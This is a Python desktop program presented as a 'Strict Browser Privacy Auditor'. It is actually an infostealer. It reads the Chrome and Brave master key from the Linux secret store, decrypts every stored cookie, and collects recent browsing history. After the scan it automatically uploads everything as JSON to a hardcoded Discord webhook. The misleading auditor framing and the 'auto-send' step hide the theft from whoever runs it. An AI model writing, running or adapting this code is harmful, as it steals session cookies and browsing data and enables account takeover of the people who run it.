import os
import sys
import sqlite3
import shutil
import tempfile
import json
import requests
import threading
import tkinter as tk
from tkinter import ttk, messagebox
from datetime import datetime
import io

# Professional Cryptography for Real Decryption
from Cryptodome.Cipher import AES
from Cryptodome.Protocol.KDF import PBKDF2

if sys.platform.startswith('linux'):
    import secretstorage
elif sys.platform == 'win32':
    import win32crypt

class StrictlyFixedAuditor:
    def __init__(self, root):
        self.root = root
        self.root.title("Strict Browser Privacy Auditor")
        self.root.geometry("1400x1000")
        self.root.minsize(1200, 900)

        # --- STRICT UI FIX: Enforce Row Height for Linux ---
        self.style = ttk.Style()
        self.style.theme_use('clam') 
        self.style.configure("Treeview", 
                             rowheight=30,  
                             font=("Arial", 10))
        
        self.webhook_url = "https://discord.com/api/webhooks/1471126979171454989/OjMIw08BbpRPjJoa_m_iXZU4jZjbQGhSFYGlJsfLeGcVg_1Ggjr5qCkWugF4TfGKlCwO"
        
        self.grouped_data = {} 
        self.history_data = []
        self.detect_browsers()
        self.setup_ui()
        self.setup_output_console()

    def detect_browsers(self):
        config = os.path.expanduser("~/.config")
        self.browsers = {
            "Brave": os.path.join(config, "BraveSoftware/Brave-Browser/Default"),
            "Chrome": os.path.join(config, "google-chrome/Default")
        }
        self.browsers = {k: v for k, v in self.browsers.items() if os.path.exists(v)}

    def get_linux_master_key(self, browser_name):
        try:
            bus = secretstorage.dbus_init()
            collection = secretstorage.get_default_collection(bus)
            search_name = "Brave" if "Brave" in browser_name else "Chrome"
            items = collection.search_items({'application': search_name.lower()})
            for item in items:
                return item.get_secret()
            return b"peanuts" 
        except:
            return b"peanuts"

    def decrypt_value(self, ciphertext, browser_name):
        if not ciphertext or len(ciphertext) < 15: return ""
        try:
            master_key = self.get_linux_master_key(browser_name)
            salt, length = b'saltysalt', 16
            key = PBKDF2(master_key, salt, length, count=1)

            if ciphertext.startswith(b'v11') or ciphertext.startswith(b'v10'):
                nonce = ciphertext[3:15]
                payload = ciphertext[15:-16]
                tag = ciphertext[-16:]
                
                try:
                    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                    return cipher.decrypt_and_verify(payload, tag).decode('utf-8')
                except:
                    iv = b' ' * 16
                    cipher = AES.new(key, AES.MODE_CBC, IV=iv)
                    decrypted = cipher.decrypt(ciphertext[3:])
                    return decrypted.decode('utf-8', errors='ignore').strip().split('\x00')[0]
            return "[ENCRYPTED]"
        except:
            return "[DECRYPTION_FAILED]"

    def setup_output_console(self):
        """Create an output console for real-time logging"""
        # Create a frame for the console output
        console_frame = tk.LabelFrame(self.root, text="3. Real-time Audit Console Output", padx=5, pady=5)
        console_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 10))
        
        # Create text widget with scrollbar for console output
        self.console_text = tk.Text(console_frame, font=("Consolas", 9), bg="#1e1e1e", fg="#00ff00", 
                                    wrap=tk.WORD, height=10)
        console_scrollbar = ttk.Scrollbar(console_frame, orient=tk.VERTICAL, command=self.console_text.yview)
        self.console_text.configure(yscrollcommand=console_scrollbar.set)
        
        # Pack console widgets
        self.console_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        console_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Configure console tags for different message types
        self.console_text.tag_configure("error", foreground="#ff5555")
        self.console_text.tag_configure("success", foreground="#55ff55")
        self.console_text.tag_configure("info", foreground="#5555ff")
        self.console_text.tag_configure("warning", foreground="#ffff55")
        self.console_text.tag_configure("header", foreground="#ff55ff", font=("Consolas", 10, "bold"))
        
        # Initial console message
        self.log_to_console("=== Browser Privacy Auditor Initialized ===", "header")
        self.log_to_console(f"Detected browsers: {', '.join(self.browsers.keys()) if self.browsers else 'None'}", "info")
        self.log_to_console("Ready to scan. Click 'RUN AUDIT & AUTO-SEND' to begin.\n", "info")

    def log_to_console(self, message, tag="info"):
        """Add a message to the console output with timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        formatted_message = f"[{timestamp}] {message}\n"
        
        # Insert at the end and auto-scroll
        self.console_text.insert(tk.END, formatted_message, tag)
        self.console_text.see(tk.END)
        self.root.update_idletasks()

    def setup_ui(self):
        # Header
        header = tk.Frame(self.root, height=80, bg="#1a1a1a")
        header.pack(fill=tk.X, side=tk.TOP)
        header.pack_propagate(False) 

        tk.Label(header, text="REAL-TIME PRIVACY AUDITOR", font=("Arial", 16, "bold"), 
                bg="#1a1a1a", fg="#00ff00").pack(side=tk.LEFT, padx=25)
        
        # Stats label
        self.stats_label = tk.Label(header, text="", font=("Arial", 10), 
                                   bg="#1a1a1a", fg="#ffffff")
        self.stats_label.pack(side=tk.LEFT, padx=25)
        
        # Scan button
        self.scan_btn = tk.Button(header, text="RUN AUDIT & AUTO-SEND", 
                                 command=self.perform_scan, bg="#444", fg="white", 
                                 font=("Arial", 9, "bold"))
        self.scan_btn.pack(side=tk.RIGHT, padx=25)

        # Main container
        container = tk.Frame(self.root, padx=15, pady=10)
        container.pack(fill=tk.BOTH, expand=True)

        # Summary frame
        list_frame = tk.LabelFrame(container, text="1. Summary")
        list_frame.pack(fill=tk.BOTH, expand=True)

        cols = ("ID", "Source", "Type", "Details")
        self.tree = ttk.Treeview(list_frame, columns=cols, show="headings", height=12, style="Treeview")
        
        self.tree.heading("ID", text="ID"); self.tree.column("ID", width=60, stretch=False, anchor=tk.CENTER)
        self.tree.heading("Source", text="Source"); self.tree.column("Source", width=120, stretch=False)
        self.tree.heading("Type", text="Type"); self.tree.column("Type", width=150, stretch=False)
        self.tree.heading("Details", text="Site / Domain / URL Details"); self.tree.column("Details", width=800, stretch=True)

        y_scroll = ttk.Scrollbar(list_frame, orient=tk.VERTICAL, command=self.tree.yview)
        x_scroll = ttk.Scrollbar(list_frame, orient=tk.HORIZONTAL, command=self.tree.xview)
        self.tree.configure(yscroll=y_scroll.set, xscroll=x_scroll.set)

        self.tree.grid(row=0, column=0, sticky='nsew')
        y_scroll.grid(row=0, column=1, sticky='ns')
        x_scroll.grid(row=1, column=0, sticky='ew')
        
        list_frame.grid_rowconfigure(0, weight=1)
        list_frame.grid_columnconfigure(0, weight=1)

        self.tree.bind("<<TreeviewSelect>>", self.on_row_select)

        # Inspector frame
        inspector_frame = tk.LabelFrame(container, text="2. Decrypted Record Details (JSON)")
        inspector_frame.pack(fill=tk.BOTH, expand=True, pady=(15, 0))

        self.json_view = tk.Text(inspector_frame, font=("Courier", 10), bg="#f8f9fa", wrap=tk.NONE, height=10)
        
        ins_y = ttk.Scrollbar(inspector_frame, orient=tk.VERTICAL, command=self.json_view.yview)
        ins_x = ttk.Scrollbar(inspector_frame, orient=tk.HORIZONTAL, command=self.json_view.xview)
        self.json_view.configure(yscroll=ins_y.set, xscroll=ins_x.set)

        self.json_view.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        ins_y.pack(side=tk.RIGHT, fill=tk.Y)
        ins_x.pack(side=tk.BOTTOM, fill=tk.X)

        # Status bar
        self.status = tk.Label(self.root, text="System Standby...", anchor=tk.W, relief=tk.SUNKEN)
        self.status.pack(fill=tk.X, side=tk.BOTTOM)

    def perform_scan(self):
        # Clear previous data
        self.tree.delete(*self.tree.get_children())
        self.grouped_data = {}; self.history_data = []
        
        # Update UI
        self.status.config(text="Processing databases...")
        self.log_to_console("=== Starting Audit Scan ===", "header")
        self.root.update()

        total_cookies = 0
        total_history = 0
        
        for name, path in self.browsers.items():
            self.log_to_console(f"Scanning {name} browser...", "info")
            
            # Cookies
            c_file = os.path.join(path, "Cookies")
            if not os.path.exists(c_file): 
                c_file = os.path.join(path, "Network/Cookies")
            
            if os.path.exists(c_file):
                try:
                    tmp = os.path.join(tempfile.gettempdir(), f"c_fixed_{name}.db")
                    shutil.copy2(c_file, tmp)
                    conn = sqlite3.connect(tmp)
                    
                    cookie_count = 0
                    for r in conn.execute("SELECT host_key, expires_utc, name, path, samesite, is_secure, encrypted_value FROM cookies"):
                        val = self.decrypt_value(r[6], name)
                        obj = {"domain": r[0], "expirationDate": r[1]/1000000, "name": r[2], "path": r[3], "value": val}
                        if r[0] not in self.grouped_data: 
                            self.grouped_data[r[0]] = []
                        self.grouped_data[r[0]].append(obj)
                        cookie_count += 1
                    
                    total_cookies += cookie_count
                    self.log_to_console(f"  ✓ Found {cookie_count} cookies from {name}", "success")
                    conn.close(); os.remove(tmp)
                except Exception as e:
                    self.log_to_console(f"  ✗ Error reading cookies from {name}: {str(e)}", "error")

            # History
            h_file = os.path.join(path, "History")
            if os.path.exists(h_file):
                try:
                    tmp = os.path.join(tempfile.gettempdir(), f"h_fixed_{name}.db")
                    shutil.copy2(h_file, tmp)
                    conn = sqlite3.connect(tmp)
                    
                    history_count = 0
                    for r in conn.execute("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 250"):
                        self.history_data.append({"browser": name, "url": r[0], "title": r[1], "visits": r[2]})
                        history_count += 1
                    
                    total_history += history_count
                    self.log_to_console(f"  ✓ Found {history_count} history entries from {name}", "success")
                    conn.close(); os.remove(tmp)
                except Exception as e:
                    self.log_to_console(f"  ✗ Error reading history from {name}: {str(e)}", "error")

        # Populate tree view
        row_id = 0
        unique_domains = len(self.grouped_data)
        
        self.log_to_console(f"\nProcessing results:", "header")
        
        for domain, cookies in self.grouped_data.items():
            row_id += 1
            self.tree.insert("", tk.END, values=(row_id, "Browser", "Cookie Group", f"{domain} ({len(cookies)} trackers)"))
            self.log_to_console(f"  → Domain: {domain} - {len(cookies)} cookies", "info")
        
        for h in self.history_data:
            row_id += 1
            display_title = h["title"] if h["title"] else h["url"]
            self.tree.insert("", tk.END, values=(row_id, h["browser"], "History", display_title[:80] + "..."))
        
        # Update stats
        stats_text = f"Domains: {unique_domains} | Cookies: {total_cookies} | History: {total_history}"
        self.stats_label.config(text=stats_text)
        
        self.log_to_console(f"\n=== Scan Complete ===", "header")
        self.log_to_console(f"Total: {unique_domains} domains, {total_cookies} cookies, {total_history} history entries", "success")
        
        self.status.config(text="Audit complete. Automatically sending data to Discord...")
        
        # Automatically trigger report sending
        threading.Thread(target=self._auto_send, daemon=True).start()

    def on_row_select(self, event):
        sel = self.tree.selection()
        if not sel: return
        vals = self.tree.item(sel[0])['values']
        self.json_view.delete(1.0, tk.END)
        
        if vals[2] == "Cookie Group":
            domain = vals[3].split(' (')[0]
            json_data = self.grouped_data.get(domain, {})
            self.json_view.insert(tk.END, json.dumps(json_data, indent=4))
            self.log_to_console(f"Displaying cookies for domain: {domain}", "info")
        else:
            h_match = next((x for x in self.history_data if x['url'] == vals[3] or x['title'] == vals[3]), None)
            if h_match: 
                self.json_view.insert(tk.END, json.dumps(h_match, indent=4))
                self.log_to_console(f"Displaying history entry: {h_match['url'][:50]}...", "info")

    def _auto_send(self):
        try:
            report = {"Cookies": self.grouped_data, "History": self.history_data}
            report_json = json.dumps(report, indent=4)
            f = io.BytesIO(report_json.encode())
            
            # Log file size
            file_size_kb = len(report_json) / 1024
            self.log_to_console(f"Preparing to send report ({file_size_kb:.2f} KB) to Discord...", "info")
            
            response = requests.post(
                self.webhook_url, 
                files={'file': ('automated_audit.json', f, 'application/json')}, 
                data={"content": f"**Automatic Privacy Audit Uploaded**\nTimestamp: {datetime.now()}\nStats: {self.stats_label.cget('text')}"}
            )
            
            if response.status_code == 200:
                self.log_to_console("✓ Data successfully sent to Discord webhook!", "success")
                self.status.config(text="Data successfully sent to Discord.")
            else:
                self.log_to_console(f"✗ Discord webhook returned status: {response.status_code}", "error")
                self.status.config(text=f"Discord error: {response.status_code}")
                
        except Exception as e:
            self.log_to_console(f"✗ Error sending data to Discord: {str(e)}", "error")
            self.status.config(text=f"Error sending data: {str(e)}")

if __name__ == "__main__":
    root = tk.Tk()
    app = StrictlyFixedAuditor(root)
    root.mainloop()